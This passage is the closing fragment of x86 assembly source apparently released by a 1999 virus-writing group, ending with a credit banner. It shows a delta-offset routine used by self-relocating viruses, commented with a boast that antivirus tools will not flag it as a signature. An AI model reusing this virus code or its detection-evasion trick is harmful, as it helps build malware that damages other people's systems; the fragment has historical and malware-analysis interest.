       push ebp                          ; this structure gets the delta
       mov ebp, esp                      ; into eax in a C like structure.
       mov eax, [ebp+4]                  ; No sane AV will consider this a
       sub eax, offset call_initiator+5  ; signature ;-)
       leave                             ;
       ret                               ;
                                         ;
end:                                     ;
end start                                ;
end                                      ;

;ÜÜÜÜÜ/ End of source code /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä--
(C) Pinoy Virus Writers 1999
lordjulus@geocities.com

